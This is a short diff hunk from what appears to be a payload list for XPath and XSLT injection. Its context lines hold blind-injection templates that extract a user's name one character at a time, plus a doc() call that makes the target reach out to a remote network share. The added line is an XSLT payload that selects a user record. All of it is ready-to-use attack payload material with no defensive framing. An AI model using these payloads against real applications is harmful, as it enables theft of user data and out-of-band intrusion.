@@ -19,3 +19,4 @@ and string-length(account)=SIZE_INT
 substring(//user[userid=5]/username,2,1)=CHAR_HERE
 substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
 *&rent_days=* and doc('//10.10.10.10/SHARE')
+<xsl:apply-templates select="//user[@id=1]"/>
